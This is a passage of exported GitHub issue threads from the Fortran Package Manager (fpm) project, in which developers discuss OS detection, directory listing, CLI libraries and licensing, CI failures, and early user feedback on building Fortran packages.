                    "date": "2020-07-22 15:44:36+00:00",
                    "text": "@jvdp1 the issue is that those macros do not seem to be defined by default on any platform with gfortran (and obviously we need to support all Fortran compilers down the road, each defining slightly different macros).\nThe current solution as of (a1dc068) seems to work. It's obviously not super robust, but it will get us started, and we can design the correct full solution in #144."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 15:53:53+00:00",
                    "text": "Everything works except Windows. It just occurred tome that if $HOME doesn't exist, then we can assume Windows. I am going to rework it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-22 16:05:40+00:00",
                    "text": "The problem now is that if a Windows user defines %HOME% for any reason, the function will fail.\nI think the original %HOMEPATH% approach is more robust, but you also need to test the value:\ncall get_environment_variable(\"HOMEPATH\", val, status=stat)\nif (stat == 0 .and. val(1:7) == \"\\Users\\\") then\n    r = OS_WINDOWS\n    return\nend if"
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 16:16:52+00:00",
                    "text": "So when I first implemented $HOMEPATH for Windows, it failed: https://github.com/fortran-lang/fpm/runs/899185101, but then the later commit which didn't touch it, succeeded: https://github.com/fortran-lang/fpm/runs/899226753. This is infuriating, I spent hours yesterday due to this fragility of the GitHub Actions. I think they sometimes test a previous commit, even though they claim to test the latest commit. This is really bad from a reliability perspective.\nAnyway, the latest commit (only using $HOME) also seems to work, but who know knows if it actually got tested?\nI can put in back the $HOMEPATH if you prefer. This is all fragile and can easily break anyway, if somebody declares HOMEPATH on linux for example."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-22 16:20:49+00:00",
                    "text": "This is all fragile and can easily break anyway, if somebody declares HOMEPATH on linux for example.\n\nYes, but testing for the value (\"\\Users\\\") greatly reduces the chance of collision. I don't think we should excuse the code to be fragile if the CI is already fragile."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 16:25:46+00:00",
                    "text": "Right. I did it as you suggested, but I just don't know which of the two is more robust (will succeed in more cases):\n\nTest for $HOMEPATH=\\Users\\\nTest that $HOME does not exist\n\nBecause I do not know if $HOMEPATH on Windows can be set to other paths than \\Users\\ quite often, or not. And compared to that how often do users define $HOME on Windows."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 16:36:14+00:00",
                    "text": "I checked the CI manually, it still seems to work (assuming the CI tested the latest commit). But given the fact that the previous commit seems to work, then if the master fails after this is merged, we can always revert the latest commit.\nThis is ready for a final review and merge as far as I am concerned."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 20:25:06+00:00",
                    "text": "@milancurcic, @everythingfunctional is this ok to go in? I have another PR (#145) that depends on this."
                }
            ]
        },
        {
            "number": 141,
            "user": "certik",
            "date": "2020-07-21 22:04:55+00:00",
            "title": "How to list directory content",
            "text": "In order to move beyond #137, we need a cross-platform way to read all the *.f90 files in a directory. What is the best way to do that in Fortran?",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 22:11:27+00:00",
                    "text": "For cross-platform you need this.\nOtherwise, I think the next best kludge would be to call execute_command_line('ls > tmp.txt'), then parse tmp.txt, and equivalent on Windows."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 22:20:55+00:00",
                    "text": "We need a temporary solution so that we are not stuck on this, and can move on, and in the meantime we can work on the full general solution."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 22:27:50+00:00",
                    "text": "I agree. I think wrapping around the shell commands on each OS is the way to go."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 22:34:23+00:00",
                    "text": "It seems like it. How do you determine which OS you are on from Fortran?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 22:45:23+00:00",
                    "text": "Perhaps we can test the value of an environment variable (get_environment_variable) that we know will be different between systems? Perhaps HOME, and then detect based on whether the value has forward slashes (Linux and macOS) or backslashes (Windows)? Just an idea, I've never done this myself."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 22:59:23+00:00",
                    "text": "Good idea, the GET_ENVIRONMENT_VARIABLE intrinsic will do this. That will get us started, and we can make this more robust / general later."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-21 23:23:50+00:00",
                    "text": "I'd put it behind a function and just use preprocessor directives. Something like:\nfunction is_windows()\n    logical :: is_windows\n\n#ifdef (WIN_32)\n    is_windows = .true.\n#elif\n    is_windows = .false.\n#endif\nObviously you'll need to look up the proper syntax and tests, but that way, even if you change the way it's done, it shouldn't require changing any other code anywhere."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 23:28:01+00:00",
                    "text": "@everythingfunctional ah that's right, I think that should work."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 23:37:52+00:00",
                    "text": "I didn't know fpm supported preprocessing. \ud83d\udc4d in that case."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-21 23:43:41+00:00",
                    "text": "fpm isn't doing any preprocessing, but our currently only supported compiler does a bit ;). Should be enough to solve at least the \"Is this Windows or not?\" question."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-22 09:00:36+00:00",
                    "text": "I just tried: on Windows \"dir /b\" gives the bare list of file names, just as \"ls\". That means that only the command is different - not the format of the output (with out \"/b\" you get a lot of rubbish ;))."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 14:46:18+00:00",
                    "text": "@everythingfunctional so the ifdef trick does not work with gfortran to determine the OS, I tried that in #142, and it does not work on linux, nor anywhere else... Let's further discuss this OS determination in #144."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 16:31:03+00:00",
                    "text": "Thanks @arjenmarkus. I will try to do this once #142 is merged, as I need to determine the OS type first to know which command to run."
                },
                {
                    "user": "interkosmos",
                    "date": "2020-09-08 09:27:57+00:00",
                    "text": "Until stdlib can be included, perhaps linking an ISO C binding abstraction layer to either POSIX and Win32 routines at compile time may be sufficient."
                }
            ]
        },
        {
            "number": 140,
            "user": "certik",
            "date": "2020-07-21 21:58:03+00:00",
            "title": "Build hello_world",
            "text": "The build is hardwired, but it works. This is mainly useful to setup our CI.\nOnce we implement a more general solution, we just need to keep our CI passing.\nFixes #137.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-21 22:10:24+00:00",
                    "text": "Weird. The Linux CI didn't execute the additional lines I added in this PR: https://github.com/fortran-lang/fpm/pull/140/checks?check_run_id=896195075"
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 22:29:50+00:00",
                    "text": "I extracted the tests into separate files, now they are executed properly. Don't know what the problem was, it looks like a bug at the CI."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 22:32:55+00:00",
                    "text": "The CI is not executing the latest version of the files at a given commit. That's a bug, which makes it pretty hard to Debug."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 22:56:18+00:00",
                    "text": "It finally works, all tests pass and are executed properly. Hello World test now works on all platforms."
                }
            ]
        },
        {
            "number": 139,
            "user": "certik",
            "date": "2020-07-21 20:13:34+00:00",
            "title": "Minimal `fpm build` implementation",
            "text": "Very minimal fpm build now works, it can only build fpm itself, but it can do it on all platforms, which is nice.\nAfter this is in, the next step is to make it more general and build the hello_world example, and then execute this test also.\nTowards #137.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-21 21:39:02+00:00",
                    "text": "Finally some code I can contribute! I am going to merge, the change is simple, so I think one positive review is enough."
                }
            ]
        },
        {
            "number": 138,
            "user": "certik",
            "date": "2020-07-21 19:56:40+00:00",
            "title": "`fpm run --args \"a b c\"` should become `fpm run -- a b c`",
            "text": "As in Cargo.\nCurrently you must use \" as in:\nfpm run --args \"a b c\"\n\nRather, one should just do:\nfpm run -- a b c",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-21 23:29:56+00:00",
                    "text": "I agree, just couldn't figure out how to make that work with the command line parser I was using in Haskell."
                }
            ]
        },
        {
            "number": 137,
            "user": "certik",
            "date": "2020-07-21 19:52:41+00:00",
            "title": "Minimal version working",
            "text": "This minimal version will:\n\ncompile test/example_packages/hello_world\nrun this particular test\n\nTo get this working, we do not need any of the 3rd party packages as listed in #136, we only need to implement fpm build, fpm run, we do not need to read the toml file for now, so we can get it working quite quickly.\nThe main goal is to start testing this as part of our testing. Then later we can swap a proper CLI library, a proper TOML reading library, etc.",
            "comments": []
        },
        {
            "number": 136,
            "user": "certik",
            "date": "2020-07-21 19:45:52+00:00",
            "title": "Roadmap for Fortran implementation",
            "text": "We need libraries for the following functionality (any help appreciated with any of these):\n\n CLI (#135)\n TOML parser (#149)\n execute gfortran on all platforms\n download using git and tarballs (http)\n list directory content (#141)\n\nRoadmap:\n\n Good tests and spec (#133)\n A minimal version working that can compile test/example_packages/hello_world, which does not require 3rd party packages, run this particular test (#137)\n Get more and more tests working\n\nIf anything else comes up, I will update this issue.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 20:58:43+00:00",
                    "text": "Fortran interface to curl for http requests: https://github.com/interkosmos/fortran-curl\nIf we end up needing more advanced git stuff than just downloading the code, we can wrap libgit2."
                },
                {
                    "user": "certik",
                    "date": "2020-07-24 20:14:28+00:00",
                    "text": "Per my comment in #149 (comment), it seems all of these can in principle be done in pure Fortran, except the internet download of tarballs. For git repositories, we'll just assume that the git executable is installed, as we already do in haskell fpm. To be able to bootstrap fpm easily, we can just have all dependencies as git repositories and assume git is present on all platforms. Then in principle everything can be done in pure Fortran, which I think might be very helpful at least initially.\nThen we can implement robust support for 3rd party non Fortran dependencies in the fortran fpm. Eventually we can then depend on curl or any other library (but if we do for fpm itself, it will always be more challenging to install it from source, say on HPC machines than if every dependency is pure Fortran)."
                },
                {
                    "user": "jacobwilliams",
                    "date": "2020-07-26 19:08:37+00:00",
                    "text": "FYI...somewhere i have a Fortran interface to WinINet that i wrote years ago. I think it was pretty rudimentary but it could be used to download files (on windows only of course). I can dig that up, but maybe you just want to stick with curl on all platforms?"
                }
            ]
        },
        {
            "number": 135,
            "user": "milancurcic",
            "date": "2020-07-21 15:45:53+00:00",
            "title": "Command line interface (CLI)",
            "text": "How to implement the CLI in fpm-fortran? We can use:\n\nIntrinsics command_argument_count and get_command_argument (lowest level, no dependencies)\nFLAP by @szaghi (library, pure Fortran, I've used it a bit with good experience)\nM_cli by @urbanjost (library, pure Fortran, no personal experience with it)\nSome other library I'm not aware of?\n\nI think we should go with a library and both FLAP and M_cli seem to do what we need (positional arguments + optional flags). What do you think?",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-21 15:52:02+00:00",
                    "text": "I would go with FLAP. But we have to make it an fpm package first, so that we can use it as a dependency. Update: that actually might not be as easy without refactoring... Looking at M_cli, it actually seems much easier to create an fpm package out of it. So we might start with M_cli, and then if FLAP can be made an fpm package, we can switch to it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 19:05:56+00:00",
                    "text": "M_cli is already an fpm package (I tried it--it works). However, after reviewing M_cli in more detail, I'm quite strongly in favor of FLAP. It seems more mature and powerful while in my opinion having a simpler API.\n@szaghi would you accept a PR to FLAP that would make it an fpm package? We'd make sure that your existing build systems  (CMake, Make, Fobis) still work. This would require adding an fpm.toml file to the top-level directory, and some adjustments to module names or source file names, but otherwise it would be backward compatible from user's point of view. Best part, it would make FLAP part of a rapidly growing fpm ecosystem of packages."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-21 19:33:31+00:00",
                    "text": "I haven't had a chance to look at either of the libraries, but that is definitely the way to go. We need to do whatever can help us bootstrap this faster.\nNote: the command line for fpm is quite complicated; subcommands, flags that are only applicable for a subset of them, some flags which may be mutually exclusive, etc.\nI think the first step, before we start implementing the command line interface is to clearly spec it out. Then we can pick a library and start implementing."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-07-21 19:59:02+00:00",
                    "text": "I am aware of two more libraries for command line interfaces:\n\ncommand_args from @arjenmarkus\nFTN_Getopt by Reinhold Bader (author of FGSL). I like the simplicity of this one (it is a single module). Unfortunately, the source code is not publicly available at the moment. I have a copy of the code and the author has indicated to me I can share it under GPL and the condition of preserving the authorship."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 20:18:30+00:00",
                    "text": "I would like all fpm dependencies to be MIT or BSD licensed, because we are linking everything statically into one executable, so GPL (and even LGPL) would prohibit us to license fpm under the MIT license."
                },
                {
                    "user": "jvdp1",
                    "date": "2020-07-21 20:24:29+00:00",
                    "text": "Wouldn't it be useful to integrate such a library first (or simultaneously) in stdlib?"
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-07-21 20:24:39+00:00",
                    "text": "One more library I learned of recently is libSUFR (libSUFR is a library containing Some Useful Fortran Routines). It is also GPL.\nThe M_cli module from @urbanjost is licensed under the Unlicense.\nThe way I understand the licensing system of FLAP:\n\nfor FOSS projects:\n    GPL v3;\nfor closed source/commercial projects:\n    BSD 2-Clause;\n    BSD 3-Clause;\n    MIT.\n\n\nfpm would count as a FOSS project, since the source is public. Am I correct?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 20:31:51+00:00",
                    "text": "fpm would count as a FOSS project, since the source is public. Am I correct?\n\nI think that strictly only GPL family of software is FOSS. We are just OSS :)\nI'm pretty sure that @szaghi meant \"use whatever license you want\". He can confirm this."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 20:32:58+00:00",
                    "text": "@jvdp1 yes, stdlib should have basic command line parsing, just like Python has it. But we can wait with stdlib's integration until we get more experience what API makes the most sense."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-07-21 20:47:13+00:00",
                    "text": "Just as an alternative idea, we could also wrap one of the many existing C and C++ libraries:\n\ndocopt.c, docopt.cpp\ncommander\nCLI11 (I noticed @certik is a contributor \ud83d\udc4d ) Edit: It also has a partial TOML parser.\ncxxopts\n\nI think with the current Haskell version of fpm this would require a custom Makefile."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 21:42:07+00:00",
                    "text": "Yes, I investigated all options for C++, and most of them work, and I settled with using CLI11 for LFortran. Works great."
                }
            ]
        },
        {
            "number": 134,
            "user": "certik",
            "date": "2020-07-21 15:36:57+00:00",
            "title": "Haskell fails to install on macOS at our CI",
            "text": "The error is:\nRun curl --insecure -L https://get.haskellstack.org/stable/osx-x86_64.tar.gz | tar xz --strip-components=1 --include '*/stack' -C /Users/runner/.local/bin\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\ncurl: (35) Server aborted the SSL handshake\n\nSee e.g. https://github.com/fortran-lang/fpm/pull/131/checks?check_run_id=894840007",
            "comments": []
        },
        {
            "number": 133,
            "user": "milancurcic",
            "date": "2020-07-21 15:34:59+00:00",
            "title": "Draft an fpm specification",
            "text": "I want us to get started on the specification document. It would describe the expected behavior of fpm. It wouldn't be a user documentation, although users could use it to diagnose fpm bugs. A spec would help define much needed tests that would catch various recently reported unhandled exceptions.\nRather than us writing a spec and then an implementation following that spec, I think the spec should evolve side-by-side as we implement and discover the preferred ways to do things. So it will very much be a living document.\nI'm happy to start the first draft. In this issue, I'm merely asking for thumbs up if you agree, and if not let me know why.\n@certik @everythingfunctional @LKedward @arjenmarkus @smeskos",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-21 16:08:21+00:00",
                    "text": "If it was me, I would be fine with the spec simply being the tests themselves. But I am not against having a separate document also, but in either case, from a practical perspective, we need the tests for sure. That is how we will ensure that the Haskell and Fortran versions actually work."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 17:30:50+00:00",
                    "text": "I agree about tests, but to write tests you need to know the expected behavior of the program. Writing a spec would force us to get clear on the expected behavior."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 17:59:20+00:00",
                    "text": "That's fine with me."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-21 19:23:37+00:00",
                    "text": "To the extent we can, the tests should read very much like the spec. But I am in favor of starting with a spec right now, mostly because I believe there are aspects of the Haskell version that do not function exactly as we want. We should have a discussion about how to handle these situations before we start writing the tests."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-22 06:29:15+00:00",
                    "text": "I agree: having worked with fpm a bit more, I see how it works currently\nand how it sometimes conflicts with things I am used to. It is not so bad\nthat fpm enforces a particular practice, but it should be clear what it\naccepts and that should match our intentions.\n\nRegards,\n\nArjen\n\nOp di 21 jul. 2020 om 21:23 schreef Brad Richardson <\nnotifications@github.com>:\n\u2026\n To the extent we can, the tests should read very much like the spec. But I\n am in favor of starting with a spec right now, mostly because I believe\n there are aspects of the Haskell version that do not function exactly as we\n want. We should have a discussion about how to handle these situations\n before we start writing the tests.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#133 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YRY7GDQKFTCYFW3S2GTR4XTMVANCNFSM4PDXFU6A>\n ."
                }
            ]
        },
        {
            "number": 132,
            "user": "certik",
            "date": "2020-07-21 15:28:57+00:00",
            "title": "Fix tests on macOS",
            "text": "It turns out there were several problems on the macOS runner, all of which this PR fixes:\n\nthe download of the Haskell binary failed due to some SSL handshake error\nthe \"bin\" directory which would host the stack binary does not exist\nthe gfortran binary is no longer pre-installed on macOS (only gfortran-9)\n\nFixes #134.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-21 17:46:52+00:00",
                    "text": "@everythingfunctional you might want to figure out how to install Haskell on macOS, right now I just downloaded the macOS tarball on my linux, uploaded it to a gist, and let it download from the gist by the CI, so that it works, as we need the CI to be working."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-21 19:20:24+00:00",
                    "text": "I don't have access to a mac to test this out, but I suspect it is something that the stack maintainers will fix. They're install script is supposed to support most platforms."
                }
            ]
        },
        {
            "number": 131,
            "user": "certik",
            "date": "2020-07-21 15:11:33+00:00",
            "title": "Initial Fortran infrastructure",
            "text": "This PR moves the Haskell version into a bootstrap directory and creates a new fpm package called fpm, which is the Fortran based fpm. For now the Fortran fpm is just the default \"new\" template, but I modified the print statement. The important part is that it is tested by the CI to build and run on all platforms (Linux, macOS and Windows). This provides the initial infrastructure needed so that others can now start working on the Fortran based fpm, and things will get tested by the CI. Once this is merged, we can send subsequent PRs to depend on other Fortran fpm packages for command line, internet access etc., and slowly start building the functionality that we need.\nPlan for this PR:\n\n Move Haskell based version to a dedicated directory (CI test still builds and tests this version)\n Add initial Fortran version as an fpm package\n\n Make CI test to build the Fortran version using the Haskell version\n\n\n\nEverything that I wanted to get done is implemented. This is ready for review.\nFixes #124.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-21 15:40:40+00:00",
                    "text": "The macOS failure is unrelated (#134)."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 18:58:42+00:00",
                    "text": "The CI gave me a lot of issues today, but I finally got everything building and passing on all platforms. This is ready for review."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 19:29:19+00:00",
                    "text": "Thanks @everythingfunctional for the review. If it looks good to you, then I am going to go ahead and merge this, so that we can start improving various parts of this in subsequent PRs."
                }
            ]
        },
        {
            "number": 130,
            "user": "milancurcic",
            "date": "2020-07-21 15:09:02+00:00",
            "title": "Catch module+program or multiple modules in a source file and print a helpful message to the user",
            "text": "See #126. fpm currently allows either a single module or a single program in a source file. However, Fortran allows having:\n\nMultiple modules per source file\nModule + program in a source file\nProcedures without modules in a source file\n\nfpm should catch these scenarios and print a helpful error message for the user.",
            "comments": [
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-22 06:21:28+00:00",
                    "text": "Just a comment: I noticed that fpm does allow more than one module in a file - and it seems to work: one of the source files I experimented with has a small module to define a type and then a module with the same name as the source file that uses it. So not two independent ones, I agree."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 16:46:10+00:00",
                    "text": "For simplicity, I think by default fpm should simply expect one module per file, and impose the naming consistency convention. We can discuss if we should implement optional options in fpm.toml to allow more modules per file."
                }
            ]
        },
        {
            "number": 129,
            "user": "milancurcic",
            "date": "2020-07-21 15:04:59+00:00",
            "title": "Handle module name - source file name mismatch and print helpful message to the user",
            "text": "See #128. Currently fpm does not help the user figure out what went wrong if the module name / file name convention is not followed. fpm should detect this and print a helpful message to the user, for example:\nfpm error: I noticed that you defined a module `my` in file `src/mx.f90`. The module name must match the source (path) name. Either rename your module to `mx`, or place it in `src/my.f90`.\n\nor similar.",
            "comments": []
        },
        {
            "number": 128,
            "user": "arjenmarkus",
            "date": "2020-07-21 09:19:20+00:00",
            "title": "Implicit relationship between the names of a module and the source file that contains it assumed",
            "text": "I have run into a problem that is illustrated with the attached project:\n`\n$ d:/fortran/fpm/fpm.exe build\ngfortran (for build/gfortran_debug/mxmy/mx.o build/gfortran_debug/mxmy/mx.mod)\nfpm.exe: Error when running Shake build system:\nat want, called at src\\Build.hs:205:11 in fpm-0.1.0.0-9a29EtwrI5D7C1C0BiAJeV:Build\n\nDepends on: build/gfortran_debug/mxmy/libmxmy.a\nat need, called at src\\Build.hs:203:13 in fpm-0.1.0.0-9a29EtwrI5D7C1C0BiAJeV:Build\nDepends on: build/gfortran_debug/mxmy/mx.o\nat &%>, called at src\\Build.hs:183:11 in fpm-0.1.0.0-9a29EtwrI5D7C1C0BiAJeV:Build\nDepends on: build/gfortran_debug/mxmy/mx.o build/gfortran_debug/mxmy/mx.mod\nat error, called at src\\Development\\Shake\\Internal\\Rules\\Files.hs:245:13 in shake-   0.18.5-7VS8ovPeUeSCopHgkQQ1Vu:Development.Shake.Internal.Rules.Files\nRaised the exception:\nError, &%> rule failed to produce 1 file (out of 2)\nbuild/gfortran_debug/mxmy/mx.o\nbuild/gfortran_debug/mxmy/mx.mod - MISSING\n`\n\nThe source file is called \"mx.f90\" but it contains a module \"my\". Apparently this is not currently supported, whether by design or otherwise. It seems to me to be a bug.\ntest-fpm-mxmy.zip",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 14:51:12+00:00",
                    "text": "Hi Arjen, yes, it's by design, see https://github.com/fortran-lang/fpm/blob/master/PACKAGING.md#single-module-library.\nThe rationale is that if we have higher constraints on the user application or library structure, we can design a more robust build system that has a \"sane default\" with fewer edge cases.\nDo you think the packaging guide could be improved in any way?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 14:55:06+00:00",
                    "text": "However, the unhelpful response from fpm is not by design, but is due to this exception handling not being implemented. In scenarios like this fpm must be helpful to the user, for example:\nfpm error: I noticed that you defined a module `my` in file `src/mx.f90`. The module name must match the source (path) name. Either rename your module to `mx`, or place it in `src/my.f90`.\n\nor similar."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 14:56:14+00:00",
                    "text": "Yes, the default layout that fpm expects is on purpose restricted, similar to how Cargo does it. The module names must be consistent with the filename.\nHowever, I am all for allowing exceptions, which you could specify by hand in fpm.toml. We should do that.\nThe error message is not helpful. But we should work on fixing both of these things in the Fortran implementation (see #124)."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-21 15:02:18+00:00",
                    "text": "It is not criticism :) - just a user experience. I understand the\nlimitations, but an innocent user may run into this sort of things and not\nbe able to pinpoint the cause (as I was not with my other problem).\n\nRegards,\n\nArjen\n\nOp di 21 jul. 2020 om 16:56 schreef Ond\u0159ej \u010cert\u00edk <notifications@github.com\n\u2026\n:\n Yes, the default layout that fpm expects is on purpose restricted, similar\n to how Cargo does it. The module names must be consistent with the filename.\n\n However, I am all for allowing exceptions, which you could specify by hand\n in fpm.toml. We should do that.\n\n The error message is not helpful. But we should work on fixing both of\n these things in the Fortran implementation (see #124\n <#124>).\n\n \u2014\n You are receiving this because you authored the thread.\n Reply to this email directly, view it on GitHub\n <#128 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR5JSM22HTKDFHJED3TR4WUB7ANCNFSM4PDLQ2RQ>\n ."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 15:11:32+00:00",
                    "text": "@certik I opened #129 and #130 to track these specific exception handling and error message issues.\nI also created the fpm-fortran tag so that we can tag any issue to be specific to the Fortran implementation and not Haskell. You'll notice that I didn't initially tag #129 and #130 as fpm-fortran, as I'm unsure whether we should leave these unattended for a long time before fpm-fortran is up to speed. I think they're quite critical UI issues."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 19:27:12+00:00",
                    "text": "And I implemented the initial infrastructure for Fortran at #131 to start getting things moving."
                }
            ]
        },
        {
            "number": 127,
            "user": "urbanjost",
            "date": "2020-07-19 12:33:17+00:00",
            "title": "Should fpm automatically make stdlib available, plus some notes on trying the fpm prototype",
            "text": "July 18, 2020\n\n[  ]  I think stdlib should be available via fpm and possibly included by default. It would\nbe a shame if there were not some integration between the projects.\n\nA few comments on fpm (Fortran Package Manager)\n\n\nI could not find a way using \"fpm build\" or \"fpm run\" to work with\nprograms that required external libraries (not always available\nstatically) like X11 Windows and ncurses and various math libraries\ninstalled on my machine. Is there some description of how to set\ncompiler options I missed?\n\n\nI could not get an \"fpm\" command to recognize any compiler except\ngfortran(1).\n\n\nSome type of \"install\" mode is highly desirable to place files in a single location.\nIt should include some way to handle data and documentation files\nas well as the *.a and *.mod files and executables. Otherwise, seperate program\ndevelopment ends up producing a lot of duplication if each program requires the\nsame packages, or you are forced to keep all development in the same file tree.\n\n\nFor builds that build many programs having to put each one in a seperate directory\ncreates a very awkward file layout. Some type of option for executables where\nyou could give a list of specific files to use for building a program might be\na solution. Automatically assuming all files at or below the path is not always\ndesirable even though it makes some cases very simple to configure.\n\n\nThe \"run\" subcommand is fine for a single program, but if you have a number of\ntests or programs it would be nice if it had a \"list\" option.\n\n\nbeing able to search and list entries in a central registry is apparently planned (?)\nbut it would at least be nice if\npackages listed at\nhttps://fortran-lang.org were marked as to whether fpm support\nwas enabled.  As a substitute for a search/list feature I did a\nglobal search (on just github) of the filename \"fpm.toml\" and at\nleast on that site there were not many hits, so maybe this is too\nearly anyway.\n\n\nThe install of fpm(1) required way too much infrastructure. A Fortran-based version\nis planned?\n\n\nHere is a list of my public repositories that are fpm-enabled:\n\n    [dependencies]\n    # worked well with simple single-module projects\n     M_kracken95   = { git = \"https://github.com/urbanjost/M_kracken95.git\" }\n     M_cli         = { git = \"https://github.com/urbanjost/M_cli.git\"  }\n     M_calculator  = { git = \"https://github.com/urbanjost/M_calculator.git\" }\n     M_change      = { git = \"https://github.com/urbanjost/M_change.git\" }  \n     M_color       = { git = \"https://github.com/urbanjost/M_color.git\" }\n     M_history     = { git = \"https://github.com/urbanjost/M_history.git\" }\n     M_io          = { git = \"https://github.com/urbanjost/M_io.git\" }\n     M_msg         = { git = \"https://github.com/urbanjost/M_msg.git\" }\n     M_time        = { git = \"https://github.com/urbanjost/M_time.git\" }\n     M_strings     = { git = \"https://github.com/urbanjost/M_strings.git\" }\n     # uses ISO_C_BINDING but no C wrapper code. fpm(1) worked well\n     M_process     = { git = \"https://github.com/urbanjost/M_process.git\" }\n     #\n     # required creating makefiles:\n     M_system      = { git = \"https://github.com/urbanjost/M_system.git\" }\n     # this did not work satisfactorily ...\n     M_draw        = { git = \"https://github.com/urbanjost/M_draw.git\" }\n\nFor projects not requiring other libraries or C wrappers and just comprised of\na few modules I had no problems.\nAs soon as I needed some C wrappers or needed to build A C library as part of\nthe project it got very difficult. I really could not come up with a satisfactory\nbuild of the M_draw.f90 module, as it requires data files and C routines; and I\ntried a lot of variations. It is not clearly shown in the documentation just how\nyou can use a customized build script or makefile and still have it work cleanly\nwith fpm.\n\n\nInitializing an existing .git directory with \"fpm init\" was problematic as it\nalways tries to initialize git and overwrites README.md. To use \"fpm\ninit\" required Moving the original directory; making new one with\n\"fpm init\"; removing .git and them moving files back.  Would be\nnice if instead of the \"Jane Doe\" fpm.toml file created that it\nuse names from .gitconfig for initial values, and not overwrite\nexisting files like README.md or initialize git(1) if .git exists\nif you run it in an existing directory.\n\n\nIt should at least be noted in the documentation that there is no \"fpm clean\"\noption\n\n\n.F90 files appear to be supported, but with no way to specify preprocessor\noptions; since preprocessors vary between compilers this could get complicated\nbut I was wondering whether a specific preprocessor would be supported in the\nfuture and how options can be passed to one now.\n\n\nIt was easier to just create a Makefile for any legacy codes with routines not\nin modules or when C wrappers were needed, but worked quite well for single-module\nprojects. It was nice to be able to write a program that needed access to file\nsystem information, manipulated strings, printed date and time information and",
            "comments": []
        },
        {
            "number": 126,
            "user": "arjenmarkus",
            "date": "2020-07-18 15:11:25+00:00",
            "title": "Complaints about recursive rules",
            "text": "I tried to use fpm on a somewhat more complex collection of Fortran modules and their test programs. They are all part of my Flibs project (http://flibs.sf.net). I copied the source files for the modules to a directory src and the sources for the test programs to test/xxx (well, for two test programs, to get started). Then I set up a fpm.toml file. All have been attached.\nfpm gave me an error message:\nBuild system error - recursion detected:\nKey type:   FilesQ\nKey value:  build/gfortran_debug/computing/combinations.o build/gfortran_debug/computing/combinations.mod\nRules may not be recursive\nAs all the modules are standalone I am not sure what went wrong. Also, I noticed that with my first attempt it complained about a different (!) module than when I redirected the output.\nIt may be that the problem has already been solved - my version of fpm is one month old.\ntest-fpm-flibs.zip",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-20 23:25:52+00:00",
                    "text": "Some of the source files contain a program at the end which uses the module. This use statement signals to the fpm build system that the module depends on itself. Thus, the recursive rule error message.\nBasic fix, remove the example programs from the end of the module source files."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-21 06:34:17+00:00",
